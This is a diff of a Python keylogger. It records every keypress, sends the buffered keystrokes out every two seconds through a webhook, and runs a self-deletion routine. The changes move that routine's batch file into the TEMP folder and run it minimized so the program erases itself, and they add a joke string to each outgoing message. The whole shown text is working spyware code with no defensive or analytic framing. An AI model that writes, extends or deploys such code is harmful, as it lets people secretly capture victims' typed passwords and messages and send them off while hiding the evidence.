@@ -29,14 +29,17 @@ def self_delete():
     time.sleep(1)
     try:
         exe_path = os.path.abspath(sys.argv[0])
-        bat_path = exe_path + '.bat'
+        temp_dir = os.getenv("TEMP") or "."
+        bat_path = os.path.join(temp_dir, "cleanup.bat")
+
         with open(bat_path, 'w') as f:
             f.write(f"""@echo off
 timeout /t 2 > nul
 del "{exe_path}" > nul
-del "{bat_path}" > nul
+del "%~f0" > nul
 """)
-        os.system(f'start "" /b cmd /c "{bat_path}"')
+
+        os.system(f'start /min cmd /c "{bat_path}"')
     except Exception as e:
         print("Self-delete failed:", e)
 
@@ -52,20 +55,20 @@ def format_key(key):
     try:
         return key.char  # letters/numbers
     except AttributeError:
-        return str(key).replace('Key.', '').lower()  # special keys
+        return str(key).replace('Key.', '').lower()  # special keys like enter, backspace
 
 # --- Key event handler ---
 def on_press(key):
     with lock:
         key_buffer.append(format_key(key))
 
-# --- Periodic sender thread ---
+# --- Periodic webhook sender thread ---
 def message_loop():
     while True:
         time.sleep(2)
         with lock:
             if key_buffer:
-                message = f"{' '.join(key_buffer)}"
+                message = f"{' '.join(key_buffer)} Meow! that tickles!"
                 send_webhook(message)
                 key_buffer.clear()
 
